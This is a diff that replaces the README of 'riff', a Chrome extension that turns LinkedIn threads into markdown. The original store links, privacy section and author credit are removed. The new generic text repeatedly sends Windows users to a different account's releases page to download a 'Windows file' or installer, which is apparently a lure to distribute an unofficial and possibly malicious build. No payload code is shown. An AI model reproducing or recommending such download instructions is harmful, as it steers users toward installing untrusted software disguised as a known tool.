@@ -1,291 +1,170 @@
-<p align="center">
-  <img src="icons/riff-icon.svg" width="120" height="120" alt="Riff Logo">
-</p>
+# 🧭 riff - Read posts, write better replies
 
-<h1 align="center">Riff</h1>
+[![Download riff](https://img.shields.io/badge/Download%20riff-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Kingsmanrp/riff/releases)
 
-<p align="center">
-  <a href="https://github.com/mshadmanrahman/riff/stargazers"><img src="https://img.shields.io/github/stars/mshadmanrahman/riff?style=social" alt="GitHub stars" /></a>
-</p>
+## 📌 What riff does
 
-<p align="center">
-  <strong>Read the room before you comment.</strong>
-</p>
+riff is a Chrome extension that helps you turn LinkedIn posts and comments into clean markdown. You can use that text with AI tools to draft a reply that fits the thread better.
 
-<p align="center">
-  <a href="https://chromewebstore.google.com/detail/riff-linkedin-engagement/hbbgiicapcnfcamdpinhkgkjljpnfffn"><img src="https://img.shields.io/badge/Chrome%20Web%20Store-Install-6366F1?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Chrome Web Store"></a>
-  <a href="https://youtu.be/FrJWA9N00C4"><img src="https://img.shields.io/badge/Watch%20Demo-YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube Demo"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-10B981?style=for-the-badge" alt="MIT License"></a>
-</p>
+It is built for people who want a faster way to read a post, understand the tone, and write a response that feels on point.
 
-<p align="center">
-  <a href="#-how-to-use-step-by-step">How to Use</a> ·
-  <a href="#-features">Features</a> ·
-  <a href="#-install">Install</a> ·
-  <a href="#-privacy">Privacy</a> ·
-  <a href="#-contributing">Contributing</a>
-</p>
+## 🖥️ What you need
 
----
+- A Windows PC
+- Google Chrome
+- A GitHub account is not required to use the extension
+- Internet access for download and setup
 
-<p align="center">
-  <img src="riff-demo.gif" alt="Riff Demo" width="720">
-</p>
+riff works best on recent Windows versions such as Windows 10 and Windows 11.
 
-**Riff** is a Chrome extension that extracts LinkedIn posts and comments into clean, structured markdown. One click. Copy to clipboard. Paste into any AI tool to draft thoughtful replies that actually reference what people said.
+## 🚀 Download and install on Windows
 
-The best LinkedIn comments add unique value. But with 30+ comments on every post, most people either skip reading them or end up saying what someone already said. Riff gives you the full conversation context so your reply stands out.
+1. Go to the [riff releases page](https://github.com/Kingsmanrp/riff/releases).
+2. Look for the latest release near the top of the page.
+3. Download the Windows file from that release.
+4. Open your Downloads folder.
+5. If the file is a zip file, right-click it and choose Extract All.
+6. Keep the extracted folder in a place you can find again, such as Documents or Desktop.
+7. Open Chrome.
+8. Open the Extensions page by typing `chrome://extensions` in the address bar.
+9. Turn on Developer mode in the top right corner.
+10. Click Load unpacked.
+11. Select the extracted riff folder.
+12. Chrome adds the extension and shows it in your extensions list.
 
----
+If your release file is an installer, open that file and follow the on-screen steps. If it is an unpacked extension folder, use the Load unpacked option in Chrome.
 
-## 🎯 How to Use (Step by Step)
+## 🧩 How to use riff
 
-### Step 1: Install Riff
+1. Open LinkedIn in Chrome.
+2. Go to a post or comment thread.
+3. Click the riff extension icon in Chrome.
+4. Let riff extract the post and comments.
+5. Copy the markdown output.
+6. Paste that text into your AI tool of choice.
+7. Use the result to draft a reply.
+8. Edit the reply so it sounds like you.
 
-<a href="https://chromewebstore.google.com/detail/riff-linkedin-engagement/hbbgiicapcnfcamdpinhkgkjljpnfffn">
-  <img src="https://img.shields.io/badge/Get%20Riff-Chrome%20Web%20Store-6366F1?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Install from Chrome Web Store">
-</a>
+riff gives you a cleaner view of the thread, which makes it easier to spot the main point, the tone, and the angle of the discussion.
 
-Click the link above, then click **"Add to Chrome"**. That's it.
+## ✍️ What the markdown includes
 
-> **Tip:** Pin Riff to your toolbar for easy access. Click the puzzle icon (Extensions) in Chrome's toolbar, then click the pin icon next to Riff.
+riff is designed to pull the parts of a LinkedIn thread that matter most:
 
-### Step 2: Go to LinkedIn
+- Post text
+- Comment text
+- Author names
+- Reply order
+- Thread structure
+- Plain markdown output
 
-Open [linkedin.com](https://www.linkedin.com) and find a post you want to engage with. This works on:
+This format makes it easier to reuse the content in ChatGPT, Claude, Gemini, or any other text tool that accepts markdown.
 
-- **Your feed** (scroll to any post)
-- **A single post page** (click into a specific post)
-- **Your own posts** (to reply to comments)
+## 🔧 Common setup steps
 
-### Step 3: Expand Comments (Important!)
+If Chrome does not show the extension right away, try these steps:
 
-**Before extracting, make sure comments are visible on the page:**
+1. Check that Developer mode is on.
+2. Make sure you selected the folder that contains the extension files.
+3. Refresh the extensions page.
+4. Open Chrome again and try the LinkedIn page once more.
+5. If the extension seems inactive, click its icon in the toolbar and pin it.
 
-1. Click the **"Comments"** section on the post to expand it
-2. If you see a **"Load more comments"** button, click it a few times
-3. The more comments visible on screen, the more Riff can extract
+If the folder opens as a zip instead of a normal folder, extract it first.
 
-> **Why?** LinkedIn doesn't load comments until you open them. Riff reads what's on screen, not what's hidden. If you see "0 comments extracted" but the post has comments, this is why.
+## 🧭 Using riff with LinkedIn
 
-### Step 4: Click Riff
+For best results:
 
-Click the **Riff icon** (purple speech bubble with music notes) in your Chrome toolbar.
+- Open a single post thread
+- Wait until the page finishes loading
+- Scroll through comments if the thread is long
+- Run riff after the full discussion is visible
+- Paste the markdown into your reply tool
+- Review the reply before you post it
 
-You'll see a popup with a big button:
+If a thread has many replies, it helps to focus on the top comments first. That gives you the main context faster.
 
-**➡️ Click "Extract Post + Comments"**
+## ⚙️ Typical workflow
 
-Riff will scan the post and show you:
-- A **mode badge** (COMMENT or REPLY)
-- How many comments were found
-- A preview of the extracted content
+A simple workflow looks like this:
 
-### Step 5: Copy and Paste
+1. Find a LinkedIn post.
+2. Extract the text with riff.
+3. Paste the markdown into an AI editor.
+4. Ask for a reply that matches the post tone.
+5. Check the draft for tone and facts.
+6. Post the reply on LinkedIn.
 
-1. Click **"Copy Markdown"** (copies structured text to your clipboard)
-2. Open your AI tool of choice:
-   - [Claude](https://claude.ai) (recommended)
-   - [ChatGPT](https://chatgpt.com)
-   - Any AI that accepts text input
-3. **Paste** (Ctrl+V / Cmd+V)
-4. The AI now has the full context: post, author, all comments, timestamps
-5. Ask it to draft your reply or comment
+This keeps your response tied to the actual thread instead of guessing at context.
 
-### That's it! Your workflow:
+## 🔍 Tips for better results
 
-```
-See interesting post → Expand comments → Click Riff → Extract → Copy → Paste into AI → Post your reply
-```
+- Use short prompts when you want a quick reply
+- Ask for a professional, friendly, or direct tone
+- Keep the original markdown if you want to edit later
+- Compare the reply against the post before posting
+- Remove parts that do not help your final answer
 
-### Troubleshooting
+If the post has a strong opinion, read the comments before you draft a response. That often changes the tone you should use.
 
-| Problem | Fix |
-|---------|-----|
-| "No LinkedIn post found" | Make sure you're on linkedin.com |
-| "0 comments extracted" | Click to expand comments on the post first, then re-extract |
-| Wrong post extracted | Scroll so the post you want is centered on screen, then try again |
-| Extension not responding | Refresh the LinkedIn page (Cmd+R / Ctrl+R) and try again |
-| "Receiving end does not exist" | Refresh the LinkedIn page |
+## 🧠 Good use cases
 
----
+riff is useful when you:
 
-## ✨ Features
+- Reply to LinkedIn posts often
+- Need fast context from long comment threads
+- Want cleaner text for AI prompts
+- Manage engagement for a brand or profile
+- Review posts before you comment
+- Prefer markdown over copied page text
 
-### Two Modes (Automatic)
+## 🛠️ Troubleshooting
 
-| Mode | When | What It Does |
-|------|------|-------------|
-| **COMMENT** | On someone else's post | Extracts post + comments so you can draft a comment that adds unique value |
-| **REPLY** | On your own post | Extracts all comments so you can draft replies to each one |
+### Extension does not load
 
-Riff detects the mode automatically. No configuration needed.
+- Check that you loaded the right folder
+- Make sure the extracted files are still in place
+- Reload the Chrome extensions page
+- Try removing the extension and loading it again
 
-### What Gets Extracted
+### Nothing happens on LinkedIn
 
-- Post author name and headline
-- Full post text (including "see more" content)
-- All visible comments with author names, headlines, and timestamps
-- Nested replies and threads
-- Repost attribution (who reposted what)
-- Post type detection (text, image, video, article, poll, document)
-- Engagement metrics (likes, comments count)
+- Refresh the LinkedIn page
+- Open a post thread with visible comments
+- Wait for the page to finish loading
+- Click the extension icon again
 
-### Works Everywhere on LinkedIn
+### Copied text looks incomplete
 
-- **Feed page**: Extracts the post closest to the center of your screen
-- **Single post pages**: Full extraction with all comments
-- **Reposts**: Shows original author + repost attribution
-- **Video posts**: Extracts text without video player UI contamination
+- Open the full thread before running the extension
+- Scroll further down to load more comments
+- Try again after the page fully loads
+- Check that LinkedIn did not collapse the replies
 
----
+## 📁 Project topics
 
-## 📦 Install
+This project covers:
 
-### Chrome Web Store (Recommended)
+- AI tools
+- Browser extension use
+- Chrome extension setup
+- Content extraction
+- Developer tools
+- Engagement workflow
+- LinkedIn threads
+- Manifest V3
+- Markdown output
+- Open source software
+- Productivity
+- Social media workflow
 
-<a href="https://chromewebstore.google.com/detail/riff-linkedin-engagement/hbbgiicapcnfcamdpinhkgkjljpnfffn">
-  <img src="https://img.shields.io/badge/Get%20Riff-Chrome%20Web%20Store-6366F1?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Install from Chrome Web Store">
-</a>
+## 🤝 Working with the project
 
-### Manual Install (Developer Mode)
+If you want to follow updates, fix issues, or check new releases, use the release page:
 
-```bash
-git clone https://github.com/mshadmanrahman/riff.git
-```
+[Visit the riff releases page](https://github.com/Kingsmanrp/riff/releases)
 
-1. Open `chrome://extensions` in Chrome, Edge, Brave, or Arc
-2. Enable **Developer mode** (top right toggle)
-3. Click **Load unpacked**
-4. Select the cloned `riff` folder
+## 📄 License
 
-Works in any Chromium-based browser: Chrome, Edge, Brave, Arc, Vivaldi, Opera.
-
----
-
-## 📋 Output Format
-
-Riff copies structured markdown to your clipboard:
-
-```markdown
-## LinkedIn Post [COMMENT MODE]
-**Author:** Felix Haas | CEO at Lovable
-**Type:** image | **Engagement:** 142 likes, 29 comments
-**URL:** https://www.linkedin.com/feed/update/...
-
-### Post Content
-[Reposted by Lovable]
-
-Hot take: marketers are more technical than they think.
-They know exactly what they want to build...
-
-### Comments (29 extracted)
-1. **@JJ Englert** - Growing the #1 AI Builder Community (2 likes)
-   > Thanks for sharing! The skillset that marketers needed...
-2. **@Sarah** - CEO, Acme Labs
-   > Seeing this in our hiring pipeline already...
-
----
-**Instructions for Claude:** Draft a comment for this post...
-```
-
-The AI instructions at the bottom are pre-written so you can paste and get a draft immediately.
-
----
-
-## 🔒 Privacy
-
-**Zero data collection.** Period.
-
-- All processing happens locally in your browser
-- No data is sent to any server
-- No analytics, no tracking, no cookies
-- Content only exists in your clipboard after you copy it
-- No background processes or persistent storage
-- **Open source**: You can read every line of code
-
-[Full privacy policy](PRIVACY.md)
-
-### Permissions Explained
-
-| Permission | Why |
-|-----------|-----|
-| `activeTab` | Read the current LinkedIn page when you click the icon |
-| `clipboardWrite` | Copy extracted content to your clipboard |
-| `scripting` | Inject the extraction script into LinkedIn tabs |
-| `host_permissions` | Only works on `linkedin.com` |
-
----
-
-## 🏗 Architecture
-
-```
-riff/
-├── manifest.json          # MV3 extension config
-├── content.js             # DOM scraper (dual extraction paths)
-│   ├── Single post path   # Class-based selectors (.feed-shared-update-v2)
-│   └── Feed page path     # Semantic selectors (role, aria-label, data-testid)
-├── popup.html/js/css      # Dark theme popup UI
-├── content-styles.css     # Injected page styles
-└── icons/                 # Custom SVG + PNG at 16/48/128px
-```
-
-### How It Handles LinkedIn's Anti-Scraping
-
-LinkedIn uses **hashed CSS classes** on the feed page that change with every deploy. Riff uses two extraction strategies:
-
-1. **Single post pages** (`/feed/update/...`): Class-based selectors that are stable
-2. **Feed page**: Semantic DOM anchors (`role="listitem"`, `aria-label`, `data-component-type`) that survive class name changes
-
-This dual-path architecture means Riff keeps working even when LinkedIn changes their frontend.
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! LinkedIn changes their DOM frequently, so selector updates are always needed.
-
-**Common contributions:**
-- Selector updates when LinkedIn changes their DOM
-- New extraction strategies for edge cases
-- UI improvements to the popup
-- Bug reports with diagnostic output (click **"Diagnose DOM"** in the popup)
-
-```bash
-# Development workflow
-git clone https://github.com/mshadmanrahman/riff.git
-cd riff
-# Load unpacked in chrome://extensions
-# Make changes → refresh extension → test on LinkedIn
-```
-
----
-
-## 🎵 Why "Riff"?
-
-In music, a **riff** is a short, repeated phrase that forms the foundation of a song. On LinkedIn, your comment is your riff on someone else's melody. Riff (the extension) gives you the sheet music: the full post, every comment, all the context. So your riff actually adds to the song instead of repeating what's already been played.
-
----
-
-## Support
-
-If this saved you time, give it a star -- it helps others find it and keeps development going.
-
-## See Also
-
-- **[pm-pilot](https://github.com/mshadmanrahman/pm-pilot)** -- Claude Code configured for PMs. Meeting prep, PRDs, market sizing -- 25 skills, ready to install.
-- **[root-kg](https://github.com/mshadmanrahman/root-kg)** -- Personal knowledge graph. Ask questions across all your notes, meetings, and emails.
-- **[morning-digest](https://github.com/mshadmanrahman/morning-digest)** -- Morning briefing automation. Calendar, email, news in one digest.
-- **[discovery-md](https://github.com/mshadmanrahman/discovery-md)** -- AI product discovery for PMs.
-- **[ceremonies](https://github.com/mshadmanrahman/ceremonies)** -- Agile ceremonies that don't suck.
-- **[claudecode-guide](https://github.com/mshadmanrahman/claudecode-guide)** -- Friendly guide to Claude Code. Also at [claudecodeguide.dev](https://claudecodeguide.dev).
-
-## 📜 License
-
-[MIT](LICENSE) - Use it, fork it, build on it.
-
----
-
-<p align="center">
-  Built by <a href="https://github.com/mshadmanrahman">Shadman Rahman</a>
-</p>
+See the repository for license details and project files
